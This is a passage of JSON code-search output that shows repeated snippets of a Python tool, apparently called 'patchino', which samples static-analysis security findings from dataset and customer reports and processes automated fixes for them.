repositories with issues\\")","detailedLines":[{"text":"async def _get_customer_report_samples(config: SamplerConfig) -> list[Sample]:","lineNumber":343,"isSignature":true},{"lineNumber":398},{"text":"    return samples","lineNumber":399,"isSignature":true},{"lineNumber":400},{"lineNumber":401},{"text":"async def _get_dataset_samples(config: SamplerConfig) -> list[Sample]:","lineNumber":402,"isSignature":true},{"text":"    samples = []","lineNumber":403},{"text":"    repo_to_issue_indexes = defaultdict(list)","lineNumber":404},{"text":"    for sast_report_summary_path in DATASET_DATA_FOLDER_PATH.rglob(\\"**/*.json\\"):","lineNumber":405},{"text":"        with open(sast_report_summary_path, \\"r\\") as f:","lineNumber":406},{"text":"            data = json.load(f)","lineNumber":407},{"lineNumber":408},{"text":"        # create a set of reports, and a dicionary from report to issue list indexes","lineNumber":409},{"text":"        for language, dict_severity_to_type in data.items():","lineNumber":410},{"text":"            if (","lineNumber":411},{"text":"                language_mapping.get(language.lower(), \\"\\")","lineNumber":412},{"text":"                not in config.sast_issue_languages","lineNumber":413},{"text":"                and language not in config.sast_issue_languages","lineNumber":414},{"text":"            ):","lineNumber":415},{"text":"                continue","lineNumber":416},{"lineNumber":417},{"text":"            for severity, issue_type_to_issue_data in dict_severity_to_type.items():","lineNumber":418},{"text":"                for issue_type, issue_data in issue_type_to_issue_data.items():","lineNumber":419},{"text":"                    if issue_type not in config.sast_issue_types:","lineNumber":420},{"text":"                        continue","lineNumber":421},{"lineNumber":422},{"text":"                    indexes = issue_data[\\"indexes\\"]","lineNumber":423},{"lineNumber":424},{"text":"                    if len(indexes) == 0:","lineNumber":425},{"text":"                        continue","lineNumber":426},{"lineNumber":427},{"text":"                    repo_to_issue_indexes[sast_report_summary_path].extend(indexes)","lineNumber":428},{"lineNumber":429},{"text":"    print(f\\"Found {len(repo_to_issue_indexes)} dataset repositories with issues\\")","lineNumber":430},{"lineNumber":431},{"text":"    while","lineNumber":432}]},"score":0.3328891098499298},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/issue_processor.py","range":{"startPosition":{"line":162},"endPosition":{"line":421}},"contents":"\\n\\n\\nasync def main():\\n    setup_json_logging(level=logging.INFO)\\n    # The config_path will be received as parameter\\n\\n    if len(sys.argv) > 1:\\n        config_path = sys.argv[1]\\n    else:\\n        # Default if no parameter is provided\\n        config_path = str(SCRIPT_PATH / \\"../_samples/samples.json\\")\\n\\n    config = ConfigManager(config_path)\\n    s3_connection = S3Access.init_connection(\\n        name=\\"patchino\\",\\n        endpoint=(\\n            AWS_S3_ENDPOINT_FROM_DOCKER if config.is_from_docker else AWS_S3_ENDPOINT\\n        ),\\n        access_key_id=AWS_S3_ACCESS_KEY_ID,\\n        secret_access_key=AWS_S3_SECRET_ACCESS_KEY,\\n        bucket=AWS_S3_STORAGE_BUCKET,\\n        region=AWS_S3_STORAGE_REGION,\\n    )\\n\\n    logger.info(f\\"Config created at: {config.created_at}\\")\\n    logger.info(f\\"Total issues: {len(config.issues_info)}\\")\\n    logger.info(f\\"Public issues: {len(config.get_public_issues())}\\")\\n    logger.info(f\\"Non-skipped issues: {len(config.get_non_skipped_issues())}\\")\\n\\n    logger.info(\\"\\\\nAll Issues:\\")\\n    for idx, issue_info in enumerate(config.issues_info):\\n        logger.info(f\\"{idx + 1}. {issue_info}\\")\\n\\n    logger.info(\\"\\\\nLoading issue objects:\\")\\n    all_issue_objects = [\\n        issue_info\\n        for issue_info in config.get_non_skipped_issues()\\n        if issue_info.issue_object\\n    ]\\n    fix_issues_results = await process_objects_in_parallel(\\n        all_issue_objects, fix_issue, batch_size=FIX_ISSUE_BATCH_SIZE\\n    )\\n\\n    all_issues = []\\n    success_issues: dict[str, IssueInfo] = {}\\n    all_fixed_files: dict[str, dict[str, str]] = {}","originalContents":"\\n\\n\\nasync def main():\\n    setup_json_logging(level=logging.INFO)\\n    # The config_path will be received as parameter\\n\\n    if len(sys.argv) > 1:\\n        config_path = sys.argv[1]\\n    else:\\n        # Default if no parameter is provided\\n        config_path = str(SCRIPT_PATH / \\"../_samples/samples.json\\")\\n\\n    config = ConfigManager(config_path)\\n    s3_connection = S3Access.init_connection(\\n        name=\\"patchino\\",\\n        endpoint=(\\n            AWS_S3_ENDPOINT_FROM_DOCKER if config.is_from_docker else AWS_S3_ENDPOINT\\n        ),\\n        access_key_id=AWS_S3_ACCESS_KEY_ID,\\n        secret_access_key=AWS_S3_SECRET_ACCESS_KEY,\\n        bucket=AWS_S3_STORAGE_BUCKET,\\n        region=AWS_S3_STORAGE_REGION,\\n    )\\n\\n    logger.info(f\\"Config created at: {config.created_at}\\")\\n    logger.info(f\\"Total issues: {len(config.issues_info)}\\")\\n    logger.info(f\\"Public issues: {len(config.get_public_issues())}\\")\\n    logger.info(f\\"Non-skipped issues: {len(config.get_non_skipped_issues())}\\")\\n\\n    logger.info(\\"\\\\nAll Issues:\\")\\n    for idx, issue_info in enumerate(config.issues_info):\\n        logger.info(f\\"{idx + 1}. {issue_info}\\")\\n\\n    logger.info(\\"\\\\nLoading issue objects:\\")\\n    all_issue_objects = [\\n        issue_info\\n        for issue_info in config.get_non_skipped_issues()\\n        if issue_info.issue_object\\n    ]\\n    fix_issues_results = await process_objects_in_parallel(\\n        all_issue_objects, fix_issue, batch_size=FIX_ISSUE_BATCH_SIZE\\n    )\\n\\n    all_issues = []\\n    success_issues: dict[str, IssueInfo] = {}\\n    all_fixed_files: dict[str, dict[str, str]] = {}","detailedLines":[{"text":"class ConfigManager:","lineNumber":163,"isSignature":true},{"text":"def get_issues_by_provider(self, provider: str) -> list[IssueInfo]:","lineNumber":218},{"text":" provider.lower()","lineNumber":223},{"text":"        ]","lineNumber":224},{"lineNumber":225},{"text":"    def __repr__(self):","lineNumber":226},{"text":"        return f\\"ConfigManager(created_at={self.created_at}, issues_count={len(self.issues_info)})\\"","lineNumber":227,"isSignature":true},{"lineNumber":228},{"lineNumber":229},{"text":"async def main():","lineNumber":230,"isSignature":true},{"text":"    setup_json_logging(level=logging.INFO)","lineNumber":231},{"text":"    # The config_path will be received as parameter","lineNumber":232},{"lineNumber":233},{"text":"    if len(sys.argv) > 1:","lineNumber":234},{"text":"        config_path = sys.argv[1]","lineNumber":235},{"text":"    else:","lineNumber":236},{"text":"        # Default if no parameter is provided","lineNumber":237},{"text":"        config_path = str(SCRIPT_PATH / \\"../_samples/samples.json\\")","lineNumber":238},{"lineNumber":239},{"text":"    config = ConfigManager(config_path)","lineNumber":240},{"text":"    s3_connection = S3Access.init_connection(","lineNumber":241},{"text":"        name=\\"patchino\\",","lineNumber":242},{"text":"        endpoint=(","lineNumber":243},{"text":"            AWS_S3_ENDPOINT_FROM_DOCKER if config.is_from_docker else AWS_S3_ENDPOINT","lineNumber":244},{"text":"        ),","lineNumber":245},{"text":"        access_key_id=AWS_S3_ACCESS_KEY_ID,","lineNumber":246},{"text":"        secret_access_key=AWS_S3_SECRET_ACCESS_KEY,","lineNumber":247},{"text":"        bucket=AWS_S3_STORAGE_BUCKET,","lineNumber":248},{"text":"        region=AWS_S3_STORAGE_REGION,","lineNumber":249},{"text":"    )","lineNumber":250},{"lineNumber":251},{"text":"    logger.info(f\\"Config created at: {config.created_at}\\")","lineNumber":252},{"text":"    logger.info(f\\"Total issues: {len(config.issues_info)}\\")","lineNumber":253},{"text":"    logger.info(f\\"Public issues: {len(config.get_public_issues())}\\")","lineNumber":254},{"text":"    logger.info(f\\"Non-skipped issues: {len(config.get_non_skipped_issues())}\\")","lineNumber":255},{"lineNumber":256},{"text":"    logger.info(\\"\\\\nAll Issues:\\")","lineNumber":257},{"text":"    for idx, issue_info in enumerate(config.issues_info):","lineNumber":258},{"text":"        logger.info(f\\"{idx + 1}. {issue_info}\\")","lineNumber":259},{"lineNumber":260},{"text":"    logger.info(\\"\\\\nLoading issue objects:\\")","lineNumber":261},{"text":"    all_issue_objects = [","lineNumber":262},{"text":"        issue_info","lineNumber":263},{"text":"        for issue_info in config.get_non_skipped_issues()","lineNumber":264},{"text":"        if issue_info.issue_object","lineNumber":265},{"text":"    ]","lineNumber":266},{"text":"    fix_issues_results = await process_objects_in_parallel(","lineNumber":267},{"text":"        all_issue_objects, fix_issue, batch_size=FIX_ISSUE_BATCH_SIZE","lineNumber":268},{"text":"    )","lineNumber":269},{"lineNumber":270},{"text":"    all_issues = []","lineNumber":271},{"text":"    success_issues: dict[str, IssueInfo] = {}","lineNumber":272},{"text":"    all_fixed_files: dict[str, dict[str, str]] = {}","lineNumber":273},{"lineNumber":274},{"text":"    for issue_info, result in zip(all_issue_objects, fix_issues_results):","lineNumber":275}]},"score":0.3203110694885254},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{"line":270},"endPosition":{"line":398}},"contents":"\\n\\n\\nasync def _get_customer_report_samples(config: SamplerConfig) -> list[Sample]:\\n    if not config.customer_report_path or not config.customer_source_archive_path:\\n        return []\\n\\n    customer_issues, report = await _get_report_issues(\\n        pathlib.Path(config.customer_report_path),\\n        pathlib.Path(config.customer_source_archive_path),\\n    )\\n    samples = []\\n\\n    if (\\n        config.customer_report_issue_indexes\\n        and len(config.customer_report_issue_indexes) > 0\\n    ):\\n        for issue_index in config.customer_report_issue_indexes:\\n            issue = customer_issues[issue_index]\\n\\n            if not issue.fingerprint_hash:\\n                print(\\n                    f\\"Skipping customer issue {issue.index} because cannot calculate fingerprint hash\\"\\n                )\\n                continue\\n\\n            samples.append(\\n                Sample(\\n                    issue=issue,\\n                    report=report,\\n                    report_path=config.customer_report_path,\\n                    source_archive_path=config.customer_source_archive_path,\\n                    is_public=False,\\n                )\\n            )","originalContents":"\\n\\n\\nasync def _get_customer_report_samples(config: SamplerConfig) -> list[Sample]:\\n    if not config.customer_report_path or not config.customer_source_archive_path:\\n        return []\\n\\n    customer_issues, report = await _get_report_issues(\\n        pathlib.Path(config.customer_report_path),\\n        pathlib.Path(config.customer_source_archive_path),\\n    )\\n    samples = []\\n\\n    if (\\n        config.customer_report_issue_indexes\\n        and len(config.customer_report_issue_indexes) > 0\\n    ):\\n        for issue_index in config.customer_report_issue_indexes:\\n            issue = customer_issues[issue_index]\\n\\n            if not issue.fingerprint_hash:\\n                print(\\n                    f\\"Skipping customer issue {issue.index} because cannot calculate fingerprint hash\\"\\n                )\\n                continue\\n\\n            samples.append(\\n                Sample(\\n                    issue=issue,\\n                    report=report,\\n                    report_path=config.customer_report_path,\\n                    source_archive_path=config.customer_source_archive_path,\\n                    is_public=False,\\n                )\\n            )","detailedLines":[{"text":"async def _save_output(config: SamplerConfig, samples: list[Sample]) -> None:","lineNumber":271,"isSignature":true},{"lineNumber":337},{"text":"            f,","lineNumber":338},{"text":"            indent=4,","lineNumber":339},{"text":"        )","lineNumber":340,"isSignature":true},{"lineNumber":341},{"lineNumber":342},{"text":"async def _get_customer_report_samples(config: SamplerConfig) -> list[Sample]:","lineNumber":343,"isSignature":true},{"text":"    if not config.customer_report_path or not config.customer_source_archive_path:","lineNumber":344},{"text":"        return []","lineNumber":345},{"lineNumber":346},{"text":"    customer_issues, report = await _get_report_issues(","lineNumber":347},{"text":"        pathlib.Path(config.customer_report_path),","lineNumber":348},{"text":"        pathlib.Path(config.customer_source_archive_path),","lineNumber":349},{"text":"    )","lineNumber":350},{"text":"    samples = []","lineNumber":351},{"lineNumber":352},{"text":"    if (","lineNumber":353},{"text":"        config.customer_report_issue_indexes","lineNumber":354},{"text":"        and len(config.customer_report_issue_indexes) > 0","lineNumber":355},{"text":"    ):","lineNumber":356},{"text":"        for issue_index in config.customer_report_issue_indexes:","lineNumber":357},{"text":"            issue = customer_issues[issue_index]","lineNumber":358},{"lineNumber":359},{"text":"            if not issue.fingerprint_hash:","lineNumber":360},{"text":"                print(","lineNumber":361},{"text":"                    f\\"Skipping customer issue {issue.index} because cannot calculate fingerprint hash\\"","lineNumber":362},{"text":"                )","lineNumber":363},{"text":"                continue","lineNumber":364},{"lineNumber":365},{"text":"            samples.append(","lineNumber":366},{"text":"                Sample(","lineNumber":367},{"text":"                    issue=issue,","lineNumber":368},{"text":"                    report=report,","lineNumber":369},{"text":"                    report_path=config.customer_report_path,","lineNumber":370},{"text":"                    source_archive_path=config.customer_source_archive_path,","lineNumber":371},{"text":"                    is_public=False,","lineNumber":372},{"text":"                )","lineNumber":373},{"text":"            )","lineNumber":374},{"text":"    else:","lineNumber":375},{"text":"        for issue in customer_issues:","lineNumber":376}]},"score":0.3197915554046631},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{},"endPosition":{"line":45,"column":33}},"contents":"from __future__ import annotations\\n\\nfrom typing import Annotated, Optional\\n\\nimport json\\nimport os\\nimport pathlib\\nimport pickle\\nimport random\\nimport tempfile\\nimport time\\nimport zipfile\\nfrom collections import defaultdict\\nfrom dataclasses import dataclass\\n\\nimport fire  # type: ignore[import-untyped]\\nfrom analyzer.highlight_nodes import highlight_nodes_report_for_issues\\nfrom analyzer.locked_alru_cache import locked_alru_cache\\nfrom annotated_types import Len\\nfrom dotenv import load_dotenv\\nfrom pycommon.report import BaseReportStream, get_report_by_file_stream\\nfrom pycommon.report.file_loader import FileLoader\\nfrom pycommon.report.issue import Issue\\nfrom pycommon.s3 import S3Access\\nfrom pydantic import BaseModel\\n\\nSCRIPT_PATH = pathlib.Path(__file__).parent\\nAUTOFIXER_DIR = SCRIPT_PATH.parent.parent.parent\\nDATASET_DATA_FOLDER_PATH = pathlib.Path(\\n    os.getenv(\\"DATASET_DATA_FOLDER_PATH\\", SCRIPT_PATH / \\"../../../dataset/data\\")\\n)\\n\\nload_dotenv(dotenv_path=AUTOFIXER_DIR / \\".env\\")\\n\\nS3_ACCESS = S3Access.init_connection(\\n    \\"DATASET_S3_COONECTION\\",\\n    \\"mobb-dev-dataset\\",\\n    \\"us-west-2\\",\\n    os.environ[\\"AWS_DATASET_S3_ACCESS_KEY_ID\\"],\\n    os.environ[\\"AWS_DATASET_S3_ACCESS_KEY\\"],\\n)","originalContents":"from __future__ import annotations\\n\\nfrom typing import Annotated, Optional\\n\\nimport json\\nimport os\\nimport pathlib\\nimport pickle\\nimport random\\nimport tempfile\\nimport time\\nimport zipfile\\nfrom collections import defaultdict\\nfrom dataclasses import dataclass\\n\\nimport fire  # type: ignore[import-untyped]\\nfrom analyzer.highlight_nodes import highlight_nodes_report_for_issues\\nfrom analyzer.locked_alru_cache import locked_alru_cache\\nfrom annotated_types import Len\\nfrom dotenv import load_dotenv\\nfrom pycommon.report import BaseReportStream, get_report_by_file_stream\\nfrom pycommon.report.file_loader import FileLoader\\nfrom pycommon.report.issue import Issue\\nfrom pycommon.s3 import S3Access\\nfrom pydantic import BaseModel\\n\\nSCRIPT_PATH = pathlib.Path(__file__).parent\\nAUTOFIXER_DIR = SCRIPT_PATH.parent.parent.parent\\nDATASET_DATA_FOLDER_PATH = pathlib.Path(\\n    os.getenv(\\"DATASET_DATA_FOLDER_PATH\\", SCRIPT_PATH / \\"../../../dataset/data\\")\\n)\\n\\nload_dotenv(dotenv_path=AUTOFIXER_DIR / \\".env\\")\\n\\nS3_ACCESS = S3Access.init_connection(\\n    \\"DATASET_S3_COONECTION\\",\\n    \\"mobb-dev-dataset\\",\\n    \\"us-west-2\\",\\n    os.environ[\\"AWS_DATASET_S3_ACCESS_KEY_ID\\"],\\n    os.environ[\\"AWS_DATASET_S3_ACCESS_KEY\\"],\\n)","detailedLines":[{"text":"from __future__ import annotations","lineNumber":1},{"lineNumber":2},{"text":"from typing import Annotated, Optional","lineNumber":3},{"lineNumber":4},{"text":"import json","lineNumber":5},{"text":"import os","lineNumber":6},{"text":"import pathlib","lineNumber":7},{"text":"import pickle","lineNumber":8},{"text":"import random","lineNumber":9},{"text":"import tempfile","lineNumber":10},{"text":"import time","lineNumber":11},{"text":"import zipfile","lineNumber":12},{"text":"from collections import defaultdict","lineNumber":13},{"text":"from dataclasses import dataclass","lineNumber":14},{"lineNumber":15},{"text":"import fire  # type: ignore[import-untyped]","lineNumber":16},{"text":"from analyzer.highlight_nodes import highlight_nodes_report_for_issues","lineNumber":17},{"text":"from analyzer.locked_alru_cache import locked_alru_cache","lineNumber":18},{"text":"from annotated_types import Len","lineNumber":19},{"text":"from dotenv import load_dotenv","lineNumber":20},{"text":"from pycommon.report import BaseReportStream, get_report_by_file_stream","lineNumber":21},{"text":"from pycommon.report.file_loader import FileLoader","lineNumber":22},{"text":"from pycommon.report.issue import Issue","lineNumber":23},{"text":"from pycommon.s3 import S3Access","lineNumber":24},{"text":"from pydantic import BaseModel","lineNumber":25},{"lineNumber":26},{"text":"SCRIPT_PATH = pathlib.Path(__file__).parent","lineNumber":27},{"text":"AUTOFIXER_DIR = SCRIPT_PATH.parent.parent.parent","lineNumber":28},{"text":"DATASET_DATA_FOLDER_PATH = pathlib.Path(","lineNumber":29},{"text":"    os.getenv(\\"DATASET_DATA_FOLDER_PATH\\", SCRIPT_PATH / \\"../../../dataset/data\\")","lineNumber":30},{"text":")","lineNumber":31},{"lineNumber":32},{"text":"load_dotenv(dotenv_path=AUTOFIXER_DIR / \\".env\\")","lineNumber":33},{"lineNumber":34},{"text":"S3_ACCESS = S3Access.init_connection(","lineNumber":35},{"text":"    \\"DATASET_S3_COONECTION\\",","lineNumber":36},{"text":"    \\"mobb-dev-dataset\\",","lineNumber":37},{"text":"    \\"us-west-2\\",","lineNumber":38},{"text":"    os.environ[\\"AWS_DATASET_S3_ACCESS_KEY_ID\\"],","lineNumber":39},{"text":"    os.environ[\\"AWS_DATASET_S3_ACCESS_KEY\\"],","lineNumber":40},{"text":")","lineNumber":41},{"lineNumber":42},{"lineNumber":43},{"text":"language_mapping = {","lineNumber":44},{"text":"    \\"asp\\": None,","lineNumber":45},{"text":"    \\"azureresourcemanager\\": None,","lineNumber":46}]},"score":0.31523633003234863},{"codeBlock":{"relativeWorkspacePath":"patchino/tests/conftest.py","range":{"startPosition":{},"endPosition":{"line":61}},"contents":"import os\\nimport pathlib\\nfrom unittest.mock import AsyncMock, MagicMock\\nfrom uuid import UUID\\n\\nimport pytest\\n\\n# Test data paths\\nTESTS_DIR = pathlib.Path(__file__).parent\\nFIXTURES_DIR = TESTS_DIR / \\"fixtures\\"\\nSAMPLE_PROMPTS_DIR = FIXTURES_DIR / \\"sample_prompt_templates\\"\\n\\n# Create directories if they don't exist\\nFIXTURES_DIR.mkdir(exist_ok=True)\\nSAMPLE_PROMPTS_DIR.mkdir(exist_ok=True)\\n\\n\\n@pytest.fixture\\ndef sample_run_id():\\n    \\"\\"\\"Generate a consistent UUID for testing.\\"\\"\\"\\n    return UUID(\\"12345678-1234-5678-9012-123456789012\\")","originalContents":"import os\\nimport pathlib\\nfrom unittest.mock import AsyncMock, MagicMock\\nfrom uuid import UUID\\n\\nimport pytest\\n\\n# Test data paths\\nTESTS_DIR = pathlib.Path(__file__).parent\\nFIXTURES_DIR = TESTS_DIR / \\"fixtures\\"\\nSAMPLE_PROMPTS_DIR = FIXTURES_DIR / \\"sample_prompt_templates\\"\\n\\n# Create directories if they don't exist\\nFIXTURES_DIR.mkdir(exist_ok=True)\\nSAMPLE_PROMPTS_DIR.mkdir(exist_ok=True)\\n\\n\\n@pytest.fixture\\ndef sample_run_id():\\n    \\"\\"\\"Generate a consistent UUID for testing.\\"\\"\\"\\n    return UUID(\\"12345678-1234-5678-9012-123456789012\\")","detailedLines":[{"text":"import os","lineNumber":1},{"text":"import pathlib","lineNumber":2},{"text":"from unittest.mock import AsyncMock, MagicMock","lineNumber":3},{"text":"from uuid import UUID","lineNumber":4},{"lineNumber":5},{"text":"import pytest","lineNumber":6},{"lineNumber":7},{"text":"# Test data paths","lineNumber":8},{"text":"TESTS_DIR = pathlib.Path(__file__).parent","lineNumber":9},{"text":"FIXTURES_DIR = TESTS_DIR / \\"fixtures\\"","lineNumber":10},{"text":"SAMPLE_PROMPTS_DIR = FIXTURES_DIR / \\"sample_prompt_templates\\"","lineNumber":11},{"lineNumber":12},{"text":"# Create directories if they don't exist","lineNumber":13},{"text":"FIXTURES_DIR.mkdir(exist_ok=True)","lineNumber":14},{"text":"SAMPLE_PROMPTS_DIR.mkdir(exist_ok=True)","lineNumber":15},{"lineNumber":16},{"lineNumber":17},{"text":"@pytest.fixture","lineNumber":18},{"text":"def sample_run_id():","lineNumber":19,"isSignature":true},{"text":"    \\"\\"\\"Generate a consistent UUID for testing.\\"\\"\\"","lineNumber":20},{"text":"    return UUID(\\"12345678-1234-5678-9012-123456789012\\")","lineNumber":21,"isSignature":true},{"lineNumber":22},{"lineNumber":23},{"text":"@pytest.fixture","lineNumber":24},{"text":"def sample_feedback_data():","lineNumber":25,"isSignature":true},{"text":"    \\"\\"\\"Sample feedback data that matches the GraphQL response structure.\\"\\"\\"","lineNumber":26}]},"score":0.3096945881843567},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{"line":242},"endPosition":{"line":339}},"contents":"\\n\\n\\nasync def _save_output(config: SamplerConfig, samples: list[Sample]) -> None:\\n    dest_path = pathlib.Path(config.output_dir_path)\\n    dest_path.mkdir(parents=True, exist_ok=True)\\n\\n    serialized_samples = []\\n\\n    for sample in samples:\\n        issue_hash = sample.issue.fingerprint_hash\\n\\n        abs_path_to_issue_object = (\\n            pathlib.Path(config.output_dir_path) / f\\"{issue_hash}.pkl\\"\\n        )\\n        path_to_issue_highlight_nodes_html = (\\n            pathlib.Path(config.output_dir_path) / f\\"{issue_hash}.html\\"\\n        )\\n\\n        rel_sast_report_path = os.path.relpath(\\n            sample.report_path, config.output_dir_path\\n        )\\n        rel_source_code_path = os.path.relpath(\\n            sample.source_archive_path, config.output_dir_path\\n        )\\n\\n        serialized_samples.append(\\n            {\\n                \\"is_public\\": sample.is_public,\\n                \\"report_index\\": sample.issue.index,\\n                \\"issue_object_hash\\": issue_hash,\\n                \\"path_to_issue_object\\": os.path.relpath(\\n                    abs_path_to_issue_object, config.output_dir_path\\n                ),\\n                \\"path_to_issue_highlight_nodes_html\\": os.path.relpath(\\n                    path_to_issue_highlight_nodes_html, config.output_dir_path\\n                ),\\n                \\"sast_report_path\\": rel_sast_report_path,\\n                \\"source_code_path\\": rel_source_code_path,\\n                \\"sast_provider\\": sample.issue.provider.name,\\n                \\"sast_provider_issue_name\\": sample.issue.raw_issue_type,\\n                \\"sast_provider_severity\\": sample.issue.raw_severity,\\n                \\"sast_provider_language\\": sample.issue.raw_language,\\n                \\"skip_issue\\": False,\\n            }\\n        )\\n\\n        with open(abs_path_to_issue_object, \\"wb\\") as f:\\n            pickle.dump(sample.issue, f, protocol=pickle.HIGHEST_PROTOCOL)","originalContents":"\\n\\n\\nasync def _save_output(config: SamplerConfig, samples: list[Sample]) -> None:\\n    dest_path = pathlib.Path(config.output_dir_path)\\n    dest_path.mkdir(parents=True, exist_ok=True)\\n\\n    serialized_samples = []\\n\\n    for sample in samples:\\n        issue_hash = sample.issue.fingerprint_hash\\n\\n        abs_path_to_issue_object = (\\n            pathlib.Path(config.output_dir_path) / f\\"{issue_hash}.pkl\\"\\n        )\\n        path_to_issue_highlight_nodes_html = (\\n            pathlib.Path(config.output_dir_path) / f\\"{issue_hash}.html\\"\\n        )\\n\\n        rel_sast_report_path = os.path.relpath(\\n            sample.report_path, config.output_dir_path\\n        )\\n        rel_source_code_path = os.path.relpath(\\n            sample.source_archive_path, config.output_dir_path\\n        )\\n\\n        serialized_samples.append(\\n            {\\n                \\"is_public\\": sample.is_public,\\n                \\"report_index\\": sample.issue.index,\\n                \\"issue_object_hash\\": issue_hash,\\n                \\"path_to_issue_object\\": os.path.relpath(\\n                    abs_path_to_issue_object, config.output_dir_path\\n                ),\\n                \\"path_to_issue_highlight_nodes_html\\": os.path.relpath(\\n                    path_to_issue_highlight_nodes_html, config.output_dir_path\\n                ),\\n                \\"sast_report_path\\": rel_sast_report_path,\\n                \\"source_code_path\\": rel_source_code_path,\\n                \\"sast_provider\\": sample.issue.provider.name,\\n                \\"sast_provider_issue_name\\": sample.issue.raw_issue_type,\\n                \\"sast_provider_severity\\": sample.issue.raw_severity,\\n                \\"sast_provider_language\\": sample.issue.raw_language,\\n                \\"skip_issue\\": False,\\n            }\\n        )\\n\\n        with open(abs_path_to_issue_object, \\"wb\\") as f:\\n            pickle.dump(sample.issue, f, protocol=pickle.HIGHEST_PROTOCOL)","detailedLines":[{"text":"async def main(","lineNumber":243,"isSignature":true},{"text":"    input_config_abs_path: str = str(SCRIPT_PATH / \\"../sampler_config.json\\"),","lineNumber":244,"isSignature":true},{"text":"):","lineNumber":245,"isSignature":true},{"lineNumber":267},{"text":"    print(\\"Done\\")","lineNumber":268,"isSignature":true},{"lineNumber":269},{"lineNumber":270},{"text":"async def _save_output(config: SamplerConfig, samples: list[Sample]) -> None:","lineNumber":271,"isSignature":true},{"text":"    dest_path = pathlib.Path(config.output_dir_path)","lineNumber":272},{"text":"    dest_path.mkdir(parents=True, exist_ok=True)","lineNumber":273},{"lineNumber":274},{"text":"    serialized_samples = []","lineNumber":275},{"lineNumber":276},{"text":"    for sample in samples:","lineNumber":277},{"text":"        issue_hash = sample.issue.fingerprint_hash","lineNumber":278},{"lineNumber":279},{"text":"        abs_path_to_issue_object = (","lineNumber":280},{"text":"            pathlib.Path(config.output_dir_path) / f\\"{issue_hash}.pkl\\"","lineNumber":281},{"text":"        )","lineNumber":282},{"text":"        path_to_issue_highlight_nodes_html = (","lineNumber":283},{"text":"            pathlib.Path(config.output_dir_path) / f\\"{issue_hash}.html\\"","lineNumber":284},{"text":"        )","lineNumber":285},{"lineNumber":286},{"text":"        rel_sast_report_path = os.path.relpath(","lineNumber":287},{"text":"            sample.report_path, config.output_dir_path","lineNumber":288},{"text":"        )","lineNumber":289},{"text":"        rel_source_code_path = os.path.relpath(","lineNumber":290},{"text":"            sample.source_archive_path, config.output_dir_path","lineNumber":291},{"text":"        )","lineNumber":292},{"lineNumber":293},{"text":"        serialized_samples.append(","lineNumber":294},{"text":"            {","lineNumber":295},{"text":"                \\"is_public\\": sample.is_public,","lineNumber":296},{"text":"                \\"report_index\\": sample.issue.index,","lineNumber":297},{"text":"                \\"issue_object_hash\\": issue_hash,","lineNumber":298},{"text":"                \\"path_to_issue_object\\": os.path.relpath(","lineNumber":299},{"text":"                    abs_path_to_issue_object, config.output_dir_path","lineNumber":300},{"text":"                ),","lineNumber":301},{"text":"                \\"path_to_issue_highlight_nodes_html\\": os.path.relpath(","lineNumber":302},{"text":"                    path_to_issue_highlight_nodes_html, config.output_dir_path","lineNumber":303},{"text":"                ),","lineNumber":304},{"text":"                \\"sast_report_path\\": rel_sast_report_path,","lineNumber":305},{"text":"                \\"source_code_path\\": rel_source_code_path,","lineNumber":306},{"text":"                \\"sast_provider\\": sample.issue.provider.name,","lineNumber":307},{"text":"                \\"sast_provider_issue_name\\": sample.issue.raw_issue_type,","lineNumber":308},{"text":"                \\"sast_provider_severity\\": sample.issue.raw_severity,","lineNumber":309},{"text":"                \\"sast_provider_language\\": sample.issue.raw_language,","lineNumber":310},{"text":"                \\"skip_issue\\": False,","lineNumber":311},{"text":"            }","lineNumber":312},{"text":"        )","lineNumber":313},{"lineNumber":314},{"text":"        with open(abs_path_to_issue_object, \\"wb\\") as f:","lineNumber":315},{"text":"            pickle.dump(sample.issue, f, protocol=pickle.HIGHEST_PROTOCOL)","lineNumber":316},{"lineNumber":317},{"text":"        with open(path_to_issue_highlight_nodes_html, \\"w\\") as f:","lineNumber":318}]},"score":0.30686768889427185},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{"line":267,"column":17},"endPosition":{"line":398}},"contents":"async def _save_output(config: SamplerConfig, samples: list[Sample]) -> None:\\n\\n\\n        ...\\n\\n\\n        with open(path_to_issue_highlight_nodes_html, \\"w\\") as f:\\n            f.write(\\n                await highlight_nodes_report_for_issues(\\n                    report_file_path=rel_sast_report_path,\\n                    source_code_dir_path=rel_source_code_path,\\n                    report=sample.report,\\n                    issues=[sample.issue],\\n                    filtered_issues=[sample.issue],\\n                    git_info={},\\n                    include_fix=False,\\n                )\\n            )\\n\\n    with open(dest_path / \\"samples.json\\", \\"w\\") as f:\\n        json.dump(\\n            {\\n                \\"created_at\\": int(time.time()),\\n                \\"issues\\": serialized_samples,\\n                \\"is_from_docker\\": config.is_from_docker,\\n            },\\n            f,\\n            indent=4,\\n        )","originalContents":"\\n\\n        with open(path_to_issue_highlight_nodes_html, \\"w\\") as f:\\n            f.write(\\n                await highlight_nodes_report_for_issues(\\n                    report_file_path=rel_sast_report_path,\\n                    source_code_dir_path=rel_source_code_path,\\n                    report=sample.report,\\n                    issues=[sample.issue],\\n                    filtered_issues=[sample.issue],\\n                    git_info={},\\n                    include_fix=False,\\n                )\\n            )\\n\\n    with open(dest_path / \\"samples.json\\", \\"w\\") as f:\\n        json.dump(\\n            {\\n                \\"created_at\\": int(time.time()),\\n                \\"issues\\": serialized_samples,\\n                \\"is_from_docker\\": config.is_from_docker,\\n            },\\n            f,\\n            indent=4,\\n        )","detailedLines":[{"text":"async def _save_output(config: SamplerConfig, samples: list[Sample]) -> None:","lineNumber":271,"isSignature":true},{"text":"    ","lineNumber":272},{"lineNumber":315},{"text":"            pickle.dump(sample.issue, f, protocol=pickle.HIGHEST_PROTOCOL)","lineNumber":316},{"lineNumber":317},{"text":"        with open(path_to_issue_highlight_nodes_html, \\"w\\") as f:","lineNumber":318},{"text":"            f.write(","lineNumber":319},{"text":"                await highlight_nodes_report_for_issues(","lineNumber":320},{"text":"                    report_file_path=rel_sast_report_path,","lineNumber":321},{"text":"                    source_code_dir_path=rel_source_code_path,","lineNumber":322},{"text":"                    report=sample.report,","lineNumber":323},{"text":"                    